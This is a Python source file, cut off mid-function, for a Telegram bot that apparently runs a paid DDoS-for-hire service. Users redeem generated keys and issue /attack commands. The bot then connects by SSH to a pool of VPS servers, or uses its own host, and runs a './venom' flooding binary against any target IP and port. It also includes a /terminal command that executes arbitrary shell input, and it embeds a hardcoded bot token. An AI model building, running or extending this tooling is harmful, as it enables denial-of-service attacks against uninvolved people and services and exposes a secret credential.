#!/usr/bin/env python3
import subprocess
import sys
import threading
import time
import json
import os
import uuid
import traceback
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Check and install required packages
try:
    import telebot
except ImportError:
    install("pyTelegramBotAPI")
    import telebot

try:
    import paramiko
except ImportError:
    install("paramiko")
    import paramiko

# ---------------------------
# Record Bot Start Time for Uptime
# ---------------------------
start_time = datetime.now()

# ---------------------------
# Periodic Print Function
# ---------------------------
def print_periodically():
    while True:
        time.sleep(240)  # 4 minutes
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Periodic message printed to the terminal.")

# ---------------------------
# Own VPS Command Execution Function
# ---------------------------
def execute_own_vps_command(target_ip, target_port, duration):
    try:
        command = f'nohup ./venom {target_ip} {target_port} {duration} 900 > /dev/null 2>&1 &'
        subprocess.Popen(command, shell=True)
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Executed on own VPS: {command}")
    except Exception as e:
        print(f"❌ Error executing command on own VPS: {e}")

# ---------------------------
# Bot and Global Setup
# ---------------------------
BOT_TOKEN = '7598762752:AAEg80AKf7_i86X9qn0H5VtOAgPpmtSd5eE'
BOT_OWNER_ID = 5730843286  # Replace with your Telegram ID

bot = telebot.TeleBot(BOT_TOKEN)

# File names for persistent storage
VPS_FILE = "vps_servers.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BLOCKED_USERS_FILE = "blocked_users.json"
COOWNERS_FILE = "coowners.json"
LOGS_FILE = "execution_logs.txt"
ADMIN_CREDITS_FILE = "admin_credits.json"  # For advanced credit system

# Global variables for execution cancellation and logging
running_channels = {}  # Maps thread name to its SSH channel
cancel_event = threading.Event()
log_lock = threading.Lock()

# Global attack settings and cooldown dictionary
global_max_duration = 60         # default maximum attack duration (seconds)
global_cooldown = 300            # default cooldown period (seconds) after an attack
attack_cooldowns = {}            # mapping: target_ip -> cooldown expiry datetime

# New: Global IP attack limit and dictionary for counting attacks per IP.
ip_attack_limit = 0
ip_attack_counts = {}

# ---------------------------
# Load and Save Coowners
# ---------------------------
def load_coowners():
    if os.path.exists(COOWNERS_FILE):
        try:
            with open(COOWNERS_FILE, 'r') as f:
                return set(json.load(f))
        except Exception as e:
            log_execution(f"Error loading coowners: {e}")
    return set()

def save_coowners(coowners):
    try:
        with open(COOWNERS_FILE, 'w') as f:
            json.dump(list(coowners), f)
    except Exception as e:
        log_execution(f"Error saving coowners: {e}")

coowners = load_coowners()

# ---------------------------
# Increase ThreadPool for Concurrency
# ---------------------------
executor = ThreadPoolExecutor(max_workers=100)

# ---------------------------
# Safe Telegram API Helpers
# ---------------------------
def safe_send(chat_id, text, parse_mode="HTML", reply_markup=None):
    try:
        bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        log_execution(f"Error sending message to {chat_id}: {e}")

def safe_reply(message, text, parse_mode="HTML"):
    try:
        bot.reply_to(message, text, parse_mode=parse_mode)
    except Exception as e:
        log_execution(f"Error replying to message from {message.from_user.id}: {e}")

# ---------------------------
# Error Handling Decorator
# ---------------------------
def safe_handler(func):
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            error_trace = traceback.format_exc()
            log_execution(f"❌ Error in {func.__name__}: {error_trace}")
            safe_reply(message, f"<b>❌ Error:</b> {str(e)}")
    return wrapper

# ---------------------------
# Logging Utility
# ---------------------------
def log_execution(message_text):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        with open(LOGS_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message_text}\n")

# ---------------------------
# Data Persistence Functions
# ---------------------------
def load_json(filename, default):
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except Exception as e:
            log_execution(f"Error loading {filename}: {e}")
    return default

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        log_execution(f"Error saving {filename}: {e}")

vps_servers = load_json(VPS_FILE, [])
keys = load_json(KEYS_FILE, {})
users = load_json(USERS_FILE, {})
blocked_users = load_json(BLOCKED_USERS_FILE, [])
admin_credits = load_json(ADMIN_CREDITS_FILE, {})

if str(BOT_OWNER_ID) not in admin_credits:
    admin_credits[str(BOT_OWNER_ID)] = {
        "balance": 1000000,
        "history": [{
            "type": "add",
            "amount": 1000000,
            "reason": "Initial credit",
            "timestamp": datetime.now().isoformat()
        }]
    }
    save_json(ADMIN_CREDITS_FILE, admin_credits)

def save_vps_data():
    save_json(VPS_FILE, vps_servers)

def save_keys_data():
    save_json(KEYS_FILE, keys)

def save_users_data():
    save_json(USERS_FILE, users)

def save_blocked_users_data():
    save_json(BLOCKED_USERS_FILE, blocked_users)

def save_admin_credits_data():
    save_json(ADMIN_CREDITS_FILE, admin_credits)

# ---------------------------
# Admin Credits Functions
# ---------------------------
def add_credit(admin_id, amount, reason=""):
    admin_id_str = str(admin_id)
    now = datetime.now().isoformat()
    if admin_id_str not in admin_credits:
        admin_credits[admin_id_str] = {"balance": 0, "history": []}
    admin_credits[admin_id_str]["balance"] += amount
    admin_credits[admin_id_str]["history"].append({
        "type": "add",
        "amount": amount,
        "reason": reason,
        "timestamp": now
    })
    save_admin_credits_data()

def deduct_credit(admin_id, amount, reason=""):
    admin_id_str = str(admin_id)
    now = datetime.now().isoformat()
    if admin_id_str not in admin_credits:
        admin_credits[admin_id_str] = {"balance": 0, "history": []}
    admin_credits[admin_id_str]["balance"] -= amount
    admin_credits[admin_id_str]["history"].append({
        "type": "deduct",
        "amount": amount,
        "reason": reason,
        "timestamp": now
    })
    save_admin_credits_data()

def get_credit_balance(admin_id):
    return admin_credits.get(str(admin_id), {"balance": 0})["balance"]

def get_credit_history(admin_id):
    return admin_credits.get(str(admin_id), {"history": []})["history"]

# ---------------------------
# Remote Command Execution via SSH
# ---------------------------
def execute_command(vps, target_ip, target_port, duration):
    try:
        command = f'nohup ./venom {target_ip} {target_port} {duration} 400 > /dev/null 2>&1 &'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        channel = stdout.channel
        thread_name = threading.current_thread().name
        running_channels[thread_name] = channel
        while not channel.exit_status_ready():
            if cancel_event.is_set():
                channel.close()
                break
            time.sleep(1)
        try:
            output = stdout.read().decode('utf-8', errors='replace')
            error_output = stderr.read().decode('utf-8', errors='replace')
        except Exception as read_err:
            output = f"❌ Error reading output: {read_err}"
            error_output = ""
        log_execution(f"📡 Output from {vps['ip']}: {output} {error_output}")
        print(f"📡 Output from {vps['ip']}:\n{output}\n{error_output}")
    except Exception as e:
        log_execution(f"❌ Error connecting to {vps['ip']}: {e}")
        print(f"❌ Error connecting to {vps['ip']}: {e}")
    finally:
        thread_name = threading.current_thread().name
        if thread_name in running_channels:
            del running_channels[thread_name]
        try:
            client.close()
        except Exception:
            pass

# ---------------------------
# New: /setip Command (Owner Only)
# ---------------------------
@bot.message_handler(commands=['setip'])
@safe_handler
def set_ip_limit_handler(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Not authorized to set IP attack limit!</b>")
        return
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /setip <number>")
        return
    try:
        limit = int(parts[1])
    except Exception:
        safe_reply(message, "<b>❌ Limit must be an integer.</b>")
        return
    global ip_attack_limit, ip_attack_counts
    ip_attack_limit = limit
    ip_attack_counts = {}
    safe_reply(message, f"<b>✅ IP attack limit set to {limit} times per IP.</b>")

# ---------------------------
# Helper: Check if user is Owner (BOT_OWNER_ID) or Coowner
# ---------------------------
def is_owner(message):
    return message.from_user.id == BOT_OWNER_ID or message.from_user.id in coowners

# ---------------------------
# /coowner Command (Owner Only)
# Usage: /coowner add <user_id> OR /coowner remove <user_id> OR /coowner list
# ---------------------------
@bot.message_handler(commands=['coowner'])
@safe_handler
def coowner_handler(message):
    if message.from_user.id != BOT_OWNER_ID:
        safe_reply(message, "<b>🚫 Only the owner can manage coowners!</b>")
        return
    parts = message.text.split()
    if len(parts) < 2:
        safe_reply(message, "<b>❓ Usage:</b> /coowner add|remove|list [user_id]")
        return
    action = parts[1].lower()
    global coowners
    if action == "add":
        if len(parts) != 3:
            safe_reply(message, "<b>❓ Usage:</b> /coowner add <user_id>")
            return
        try:
            user_id = int(parts[2])
        except Exception:
            safe_reply(message, "<b>❌ User ID must be an integer.</b>")
            return
        coowners.add(user_id)
        save_coowners(coowners)
        safe_reply(message, f"<b>✅ User {user_id} added as coowner.</b>")
    elif action == "remove":
        if len(parts) != 3:
            safe_reply(message, "<b>❓ Usage:</b> /coowner remove <user_id>")
            return
        try:
            user_id = int(parts[2])
        except Exception:
            safe_reply(message, "<b>❌ User ID must be an integer.</b>")
            return
        if user_id in coowners:
            coowners.remove(user_id)
            save_coowners(coowners)
            safe_reply(message, f"<b>✅ User {user_id} removed from coowners.</b>")
        else:
            safe_reply(message, "<b>ℹ️ User is not a coowner.</b>")
    elif action == "list":
        if coowners:
            reply = "<b>👥 Coowners:</b>\n"
            for uid in coowners:
                reply += f"<code>{uid}</code>\n"
            safe_reply(message, reply)
        else:
            safe_reply(message, "<b>ℹ️ No coowners set.</b>")
    else:
        safe_reply(message, "<b>❓ Unknown action. Use add, remove, or list.</b>")

# ---------------------------
# Modified Help Command
# ---------------------------
@bot.message_handler(commands=['help'])
@safe_handler
def send_help(message):
    if is_owner(message):
        help_text = "<b>🤖 Owner/Coowner Help</b>\n\n"
        help_text += "<b>General Commands:</b>\n"
        help_text += "/start - Welcome message\n"
        help_text += "/help - Show this help\n"
        help_text += "/uptime - Check bot uptime\n\n"
        help_text += "<b>Key Management:</b>\n"
        help_text += "/genkey <validity> <max_users> <max_duration> <prefix> - Generate multiple keys (one per user)\n"
        help_text += "/usekey <key> - Register a key\n"
        help_text += "/keyinfo - View your key info\n"
        help_text += "/revoke <key> - Revoke a key\n"
        help_text += "/listkeys - List all keys\n"
        help_text += "/keyadmin - Key admin info\n\n"
        help_text += "<b>VPS Management:</b>\n"
        help_text += "/addvps <ip> <username> <password> - Add a VPS\n"
        help_text += "/listvps - List VPS\n"
        help_text += "/removevps <ip> - Remove a VPS\n"
        help_text += "/updatevps <ip> <new_username> <new_password> - Update a VPS\n"
        help_text += "/status - Check VPS status\n"
        help_text += "/logs - Show logs\n\n"
        help_text += "<b>Attack Commands:</b>\n"
        help_text += "/attack <target_ip> <target_port> <time> - Launch an attack\n"
        help_text += "/setip <number> - Set max attacks allowed per target IP\n\n"
        help_text += "<b>User Management:</b>\n"
        help_text += "/blockuser <user_id> - Block a user\n"
        help_text += "/unblockuser <user_id> - Unblock a user\n"
        help_text += "/activeusers - List active users\n\n"
        help_text += "<b>Admin Commands:</b>\n"
        help_text += "/setduration <seconds> - Set global max duration\n"
        help_text += "/setcooldown <seconds> - Set global cooldown\n"
        help_text += "/cancel - Cancel execution\n"
        help_text += "/admin - Open admin panel\n"
        help_text += "/checkcredits - Check credit balance\n"
        help_text += "/addcredit <admin_id> <amount> - Add credits\n"
        help_text += "/addadmin <admin_id> [initial_credit] - Add an admin\n"
        help_text += "/removeadmin <admin_id> - Remove an admin\n"
        help_text += "/terminal <command> - Execute a shell command\n"
        help_text += "/coowner add|remove|list <user_id> (Owner only)\n"
        safe_reply(message, help_text)
    else:
        help_text = "<b>🤖 User Help</b>\n\n"
        help_text += "<b>General Commands:</b>\n"
        help_text += "/start - Welcome message\n"
        help_text += "/help - Show this help\n"
        help_text += "/uptime - Check bot uptime\n\n"
        help_text += "<b>Key Management:</b>\n"
        help_text += "/usekey <key> - Register a key\n"
        help_text += "/keyinfo - View your key info\n\n"
        help_text += "<b>Attack Commands:</b>\n"
        help_text += "/attack <target_ip> <target_port> <time> - Launch an attack\n"
        safe_reply(message, help_text)

# ---------------------------
# Other Command Handlers
# ---------------------------
@bot.message_handler(commands=['start'])
@safe_handler
def send_welcome(message):
    if message.from_user.id in blocked_users:
        safe_reply(message, "<b>🚫 You are blocked from using this bot!</b>")
        return
    welcome_text = "<b>👋 Welcome to the VPS Manager Bot!</b>\nPlease use /help to view available commands."
    safe_reply(message, welcome_text)

@bot.message_handler(commands=['uptime'])
@safe_handler
def uptime_handler(message):
    uptime_duration = datetime.now() - start_time
    uptime_str = str(uptime_duration).split('.')[0]
    safe_reply(message, f"<b>🤖 Uptime:</b> {uptime_str}")

# ---------------------------
# Modified /genkey Command (Owner Only)
# ---------------------------
@bot.message_handler(commands=['genkey'])
@safe_handler
def generate_key(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to generate keys!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 5:
        safe_reply(message, "<b>❓ Usage:</b> /genkey <validity> <max_users> <max_duration> <prefix>")
        return
    validity_arg, max_users_arg, max_duration_arg, prefix_arg = command_parts[1:5]
    validity_lower = validity_arg.lower()
    try:
        number = int(''.join(filter(str.isdigit, validity_arg)))
    except Exception:
        safe_reply(message, "<b>❌ Error parsing validity.</b> Include a number.")
        return
    if "day" in validity_lower:
        expiration = datetime.now() + timedelta(days=number)
    elif "min" in validity_lower:
        expiration = datetime.now() + timedelta(minutes=number)
    else:
        safe_reply(message, "<b>❌ Invalid validity format.</b>")
        return
    try:
        num_keys = int(''.join(filter(str.isdigit, max_users_arg)))
        max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
    except Exception:
        safe_reply(message, "<b>❌ Error parsing max_users or max_duration.</b>")
        return
    prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
    generated_keys = []
    for _ in range(num_keys):
        suffix = uuid.uuid4().hex[:6].upper()
        new_key = prefix + suffix
        keys[new_key] = {
            "expires_at": expiration.isoformat(),
            "max_users": 1,
            "max_duration": max_duration,
            "used": [],
            "generated_by": message.from_user.id
        }
        generated_keys.append(new_key)
    save_keys_data()
    reply = "<b>✅ Keys generated:</b>\n"
    for k in generated_keys:
        reply += f"<code>{k}</code>\n"
    reply += f"<b>Expires at:</b> {expiration}\n"
    reply += f"<b>Max Duration:</b> {max_duration} seconds"
    safe_reply(message, reply)

@bot.message_handler(commands=['usekey'])
@safe_handler
def use_key_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /usekey <key>")
        return
    provided_key = command_parts[1].strip()
    if provided_key not in keys:
        safe_reply(message, "<b>❌ Invalid key!</b>")
        return
    key_data = keys[provided_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        safe_reply(message, "<b>⏰ Key expired!</b>")
        return
    if len(key_data["used"]) >= key_data["max_users"]:
        safe_reply(message, "<b>⚠️ Key has already been used!</b>")
        return
    user_id_str = str(message.from_user.id)
    if user_id_str in key_data["used"]:
        safe_reply(message, "<b>ℹ️ You have already registered this key.</b>")
        return
    key_data["used"].append(user_id_str)
    save_keys_data()
    users[user_id_str] = provided_key
    save_users_data()
    safe_reply(message, f"<b>✅ Key accepted!</b> You can attack for {key_data['max_duration']} seconds.")

@bot.message_handler(commands=['setduration'])
@safe_handler
def set_duration_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to set max duration!</b>")
        return
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /setduration <seconds>")
        return
    try:
        duration = int(parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ Duration must be an integer.</b>")
        return
    global global_max_duration
    global_max_duration = duration
    safe_reply(message, f"<b>✅ Global max attack duration set to:</b> {duration} seconds")

@bot.message_handler(commands=['setcooldown'])
@safe_handler
def set_cooldown_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to set cooldown!</b>")
        return
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /setcooldown <seconds>")
        return
    try:
        cooldown = int(parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ Cooldown must be an integer.</b>")
        return
    global global_cooldown
    global_cooldown = cooldown
    safe_reply(message, f"<b>✅ Global cooldown set to:</b> {cooldown} seconds")

@bot.message_handler(commands=['attack'])
@safe_handler
def attack_vps(message):
    user_id_str = str(message.from_user.id)
    if user_id_str not in users:
        safe_reply(message, "<b>🚫 Not authorized.</b> Register using /usekey <key>.")
        return
    user_key = users[user_id_str]
    if user_key not in keys:
        safe_reply(message, "<b>❌ Key invalid!</b>")
        return
    key_data = keys[user_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        safe_reply(message, "<b>⏰ Key expired!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_reply(message, "<b>❓ Usage:</b> /attack <target_ip> <target_port> <time>")
        return
    ip = command_parts[1]
    port = command_parts[2]
    try:
        duration = int(command_parts[3])
    except ValueError:
        safe_reply(message, "<b>❌ Duration must be an integer.</b>")
        return
    if duration > global_max_duration:
        safe_reply(message, f"<b>⚠️ Duration exceeds global max duration of {global_max_duration} seconds.</b>")
        return
    # Check IP attack limit if set
    if ip_attack_limit and ip_attack_limit > 0:
        count = ip_attack_counts.get(ip, 0)
        if count >= ip_attack_limit:
            safe_reply(message, f"<b>🚫 This IP has reached its attack limit of {ip_attack_limit} times.</b>")
            return
        else:
            ip_attack_counts[ip] = count + 1
    if duration > key_data["max_duration"]:
        safe_reply(message, f"<b>⚠️ Duration exceeds your key's max duration of {key_data['max_duration']} seconds.</b>")
        return
    # Notify owner about the attack initiation
    owner_message = (f"Attack initiated by User ID: <code>{message.from_user.id}</code>\n"
                     f"Target: <code>{ip}:{port}</code>\n"
                     f"Duration: {duration} seconds")
    safe_send(BOT_OWNER_ID, owner_message)
    # Execute attack using executor for high concurrency
    if not vps_servers:
        safe_reply(message, "<b>ℹ️ No external VPS available. Executing on your own VPS.</b>")
        executor.submit(execute_own_vps_command, ip, port, duration)
    else:
        cancel_event.clear()
        safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
        attack_cooldowns[ip] = datetime.now() + timedelta(seconds=global_cooldown)
        for vps in vps_servers:
            executor.submit(execute_command, vps, ip, port, duration)

@bot.message_handler(commands=['activeusers'])
@safe_handler
def active_users_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to view active users!</b>")
        return
    if not users:
        safe_reply(message, "<b>ℹ️ No active users.</b>")
        return
    reply = "<b>👥 Active Users:</b>\n"
    for user_id, key in users.items():
        reply += f"User ID: <code>{user_id}</code> | Key: <code>{key}</code>\n"
    safe_reply(message, reply)

@bot.message_handler(commands=['keyadmin'])
@safe_handler
def key_admin_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to view key admin info!</b>")
        return
    if not keys:
        safe_reply(message, "<b>ℹ️ No keys generated.</b>")
        return
    reply = "<b>🔑 Key Generation Info:</b>\n"
    for key_val, details in keys.items():
        gen_by = details.get("generated_by", "N/A")
        reply += f"Key: <code>{key_val}</code> | Generated by Admin ID: <code>{gen_by}</code>\n"
    safe_reply(message, reply)

@bot.message_handler(commands=['addvps'])
@safe_handler
def add_vps_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to add VPS!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_reply(message, "<b>❓ Usage:</b> /addvps <ip> <username> <password>")
        return
    ip, username, password = command_parts[1:4]
    new_vps = {'ip': ip, 'username': username, 'password': password}
    vps_servers.append(new_vps)
    save_vps_data()
    safe_reply(message, f"<b>✅ VPS {ip} added!</b>")

@bot.message_handler(commands=['listvps'])
@safe_handler
def list_vps_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to view VPS list!</b>")
        return
    if not vps_servers:
        safe_reply(message, "<b>ℹ️ No VPS registered.</b>")
        return
    reply = "<b>🖥️ Active VPS:</b>\n"
    for idx, vps in enumerate(vps_servers):
        reply += f"{idx+1}. IP: <code>{vps['ip']}</code>, Username: <code>{vps['username']}</code>\n"
    safe_reply(message, reply)

@bot.message_handler(commands=['removevps'])
@safe_handler
def remove_vps_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to remove VPS!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /removevps <ip>")
        return
    ip_to_remove = command_parts[1]
    removed = False
    for vps in vps_servers:
        if vps['ip'] == ip_to_remove:
            vps_servers.remove(vps)
            removed = True
            break
    if removed:
        save_vps_data()
        safe_reply(message, f"<b>✅ VPS {ip_to_remove} removed!</b>")
    else:
        safe_reply(message, f"<b>❌ VPS {ip_to_remove} not found.</b>")

@bot.message_handler(commands=['updatevps'])
@safe_handler
def update_vps_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to update VPS!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_reply(message, "<b>❓ Usage:</b> /updatevps <ip> <new_username> <new_password>")
        return
    ip, new_username, new_password = command_parts[1:4]
    updated = False
    for vps in vps_servers:
        if vps['ip'] == ip:
            vps['username'] = new_username
            vps['password'] = new_password
            updated = True
            break
    if updated:
        save_vps_data()
        safe_reply(message, f"<b>✅ VPS {ip} updated!</b>")
    else:
        safe_reply(message, f"<b>❌ VPS {ip} not found.</b>")

@bot.message_handler(commands=['status'])
@safe_handler
def status_vps_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to check VPS status!</b>")
        return
    status_report = ""
    for vps in vps_servers:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=5)
            status_report += f"IP <code>{vps['ip']}</code> is <b>ONLINE</b> ✅.\n"
            client.close()
        except Exception:
            status_report += f"IP <code>{vps['ip']}</code> is <b>OFFLINE</b> ❌.\n"
    safe_reply(message, status_report)

@bot.message_handler(commands=['logs'])
@safe_handler
def show_logs_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to view logs!</b>")
        return
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, 'r') as f:
                logs = f.read()
            safe_reply(message, f"<b>📜 Logs:</b>\n<pre>{logs}</pre>")
        except Exception as e:
            safe_reply(message, f"<b>❌ Error reading logs:</b> {e}")
    else:
        safe_reply(message, "<b>ℹ️ No logs available.</b>")

@bot.message_handler(commands=['revoke'])
@safe_handler
def revoke_key_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to revoke keys!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /revoke <key>")
        return
    key_to_revoke = command_parts[1].strip()
    if key_to_revoke in keys:
        del keys[key_to_revoke]
        save_keys_data()
        safe_reply(message, f"<b>✅ Key {key_to_revoke} revoked!</b>")
    else:
        safe_reply(message, "<b>❌ Key not found.</b>")

@bot.message_handler(commands=['listkeys'])
@safe_handler
def list_keys_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to list keys!</b>")
        return
    if not keys:
        safe_reply(message, "<b>ℹ️ No keys generated.</b>")
        return
    reply = "<b>🔑 Generated Keys:</b>\n"
    for key_val, details in keys.items():
        reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
                  f"Max Duration: {details['max_duration']} sec\n")
    safe_reply(message, reply)

@bot.message_handler(commands=['keyinfo'])
@safe_handler
def key_info_handler(message):
    user_id_str = str(message.from_user.id)
    if user_id_str not in users:
        safe_reply(message, "<b>ℹ️ You have not registered a key.</b> Use /usekey <key>.")
        return
    user_key = users[user_id_str]
    if user_key not in keys:
        safe_reply(message, "<b>❌ Your key is invalid.</b> Register again using /usekey <key>.")
        return
    details = keys[user_key]
    info_text = (f"<b>🔑 Key:</b> <code>{user_key}</code>\n"
                 f"<b>Expires at:</b> {details['expires_at']}\n"
                 f"<b>Max Duration:</b> {details['max_duration']} seconds\n"
                 f"<b>Users registered:</b> {len(details['used'])}")
    safe_reply(message, info_text)

@bot.message_handler(commands=['blockuser'])
@safe_handler
def block_user_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to block users!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /blockuser <user_id>")
        return
    try:
        user_to_block = int(command_parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
        return
    if user_to_block not in blocked_users:
        blocked_users.append(user_to_block)
        save_blocked_users_data()
        safe_reply(message, f"<b>✅ User {user_to_block} blocked!</b>")
    else:
        safe_reply(message, "<b>ℹ️ User already blocked.</b>")

@bot.message_handler(commands=['unblockuser'])
@safe_handler
def unblock_user_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to unblock users!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, "<b>❓ Usage:</b> /unblockuser <user_id>")
        return
    try:
        user_to_unblock = int(command_parts[1])
    except ValueError:
        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
        return
    if user_to_unblock in blocked_users:
        blocked_users.remove(user_to_unblock)
        save_blocked_users_data()
        safe_reply(message, f"<b>✅ User {user_to_unblock} unblocked!</b>")
    else:
        safe_reply(message, "<b>ℹ️ User is not blocked.</b>")

@bot.message_handler(commands=['cancel'])
@safe_handler
def cancel_execution_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to cancel execution!</b>")
        return
    cancel_event.set()
    for thread_name, channel in list(running_channels.items()):
        try:
            channel.close()
        except Exception:
            pass
    safe_reply(message, "<b>🛑 Cancellation signal sent.</b>")
    time.sleep(2)
    cancel_event.clear()

# ---------------------------
# Terminal Command (Owner Only)
# ---------------------------
@bot.message_handler(commands=['terminal'])
@safe_handler
def terminal_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to use terminal!</b>")
        return
    command_text = message.text.partition(" ")[2]
    if not command_text:
        safe_reply(message, "<b>❓ Usage:</b> /terminal <command>")
        return
    try:
        result = subprocess.check_output(command_text, shell=True, stderr=subprocess.STDOUT, timeout=15)
        result_text = result.decode('utf-8', errors='replace')
    except subprocess.CalledProcessError as e:
        result_text = f"❌ Command failed:\n{e.output.decode('utf-8', errors='replace')}"
    except Exception as e:
        result_text = f"❌ Error: {str(e)}"
    if len(result_text) > 4000:
        result_text = result_text[:4000] + "\n...Output truncated."
    safe_reply(message, f"<b>Terminal Output:</b>\n<pre>{result_text}</pre>")

@bot.message_handler(commands=['admin'])
@safe_handler
def admin_panel_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to access admin panel!</b>")
        return
    keyboard = telebot.types.InlineKeyboardMarkup()
    button_genkey = telebot.types.InlineKeyboardButton(text="✨ Generate Key", callback_data="admin_genkey")
    button_listkeys = telebot.types.InlineKeyboardButton(text="📜 List Keys", callback_data="admin_listkeys")
    button_revoke = telebot.types.InlineKeyboardButton(text="❌ Revoke Key", callback_data="admin_revoke")
    keyboard.row(button_genkey, button_listkeys)
    keyboard.row(button_revoke)
    admin_text = "<b>🛠️ Admin Panel</b>\nSelect an action:"
    safe_send(message.chat.id, admin_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
@safe_handler
def admin_callback(call):
    chat_id = call.message.chat.id if call.message else call.from_user.id
    if call.data == "admin_genkey":
        bot.answer_callback_query(call.id, text="⏳ Please provide parameters...")
        safe_send(chat_id,
                  "Send parameters as: <code>validity max_users max_duration prefix</code>\nExample: <code>1day 10user 60duration MYKEY</code>")
        bot.register_next_step_handler(call.message, admin_generate_key_step)
    elif call.data == "admin_listkeys":
        bot.answer_callback_query(call.id, text="⏳ Loading keys...")
        if not keys:
            safe_send(chat_id, "<b>ℹ️ No keys generated.</b>")
        else:
            reply = "<b>🔑 Generated Keys:</b>\n"
            for key_val, details in keys.items():
                reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
                          f"Max Duration: {details['max_duration']} sec\n")
            safe_send(chat_id, reply)
    elif call.data == "admin_revoke":
        bot.answer_callback_query(call.id, text="⏳ Awaiting key to revoke...")
        safe_send(chat_id, "Send key to revoke as: <code>revoke KEY_VALUE</code>")
        bot.register_next_step_handler(call.message, admin_revoke_key)

def admin_generate_key_step(message):
    admin_id = message.from_user.id
    params = message.text.split()
    if len(params) != 4:
        safe_reply(message, "<b>❌ Incorrect format.</b> Send: validity max_users max_duration prefix")
        return
    validity_arg, max_users_arg, max_duration_arg, prefix_arg = params
    validity_lower = validity_arg.lower()
    try:
        number = int(''.join(filter(str.isdigit, validity_arg)))
    except Exception:
        safe_reply(message, "<b>❌ Error parsing validity.</b> Include a number (e.g., '1day' or '15min').")
        return
    if "day" in validity_lower:
        minutes = number * 24 * 60
        validity_cost = (minutes + 14) // 15
        expiration = datetime.now() + timedelta(days=number)
    elif "min" in validity_lower:
        minutes = number
        validity_cost = (minutes + 14) // 15
        expiration = datetime.now() + timedelta(minutes=number)
    else:
        safe_reply(message, "<b>❌ Invalid validity format.</b> Use 'day' or 'min'.")
        return
    try:
        num_keys = int(''.join(filter(str.isdigit, max_users_arg)))
        max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
    except Exception:
        safe_reply(message, "<b>❌ Error parsing max_users or max_duration.</b>")
        return
